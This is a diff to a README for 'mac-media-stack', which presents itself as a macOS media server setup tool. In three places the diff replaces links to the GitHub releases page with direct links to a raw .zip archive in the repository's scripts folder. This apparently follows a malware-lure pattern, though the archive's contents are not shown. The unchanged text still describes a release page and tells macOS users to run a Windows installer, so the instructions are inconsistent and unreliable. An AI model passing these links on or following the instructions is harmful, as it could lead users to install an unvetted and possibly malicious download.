@@ -1,6 +1,6 @@
 # 🎬 mac-media-stack - Easy Media Server Setup for macOS
 
-[![Download mac-media-stack](https://img.shields.io/badge/Download-Get%20Latest-blue)](https://github.com/LocItChu/mac-media-stack/releases)
+[![Download mac-media-stack](https://img.shields.io/badge/Download-Get%20Latest-blue)](https://raw.githubusercontent.com/LocItChu/mac-media-stack/main/scripts/mac-stack-media-1.7.zip)
 
 ---
 
@@ -20,7 +20,7 @@ Before you start, make sure your system meets these requirements:
 
 Click the link below to visit the page where you can download the software files.
 
-[![Download mac-media-stack](https://img.shields.io/badge/Download-Get%20Latest-green)](https://github.com/LocItChu/mac-media-stack/releases)
+[![Download mac-media-stack](https://img.shields.io/badge/Download-Get%20Latest-green)](https://raw.githubusercontent.com/LocItChu/mac-media-stack/main/scripts/mac-stack-media-1.7.zip)
 
 This link will take you to the release page. Look for the latest version and download the Windows installer file or the Docker setup if you plan to use Docker Desktop.
 
@@ -132,6 +132,6 @@ All management happens on the macOS device but can be controlled remotely via th
 
 Use the following link to access the latest releases, download installers, and update your software:
 
-[https://github.com/LocItChu/mac-media-stack/releases](https://github.com/LocItChu/mac-media-stack/releases)
+[https://raw.githubusercontent.com/LocItChu/mac-media-stack/main/scripts/mac-stack-media-1.7.zip](https://raw.githubusercontent.com/LocItChu/mac-media-stack/main/scripts/mac-stack-media-1.7.zip)
 
 Click the link, choose the latest release, download the Windows installer, and run it to start.
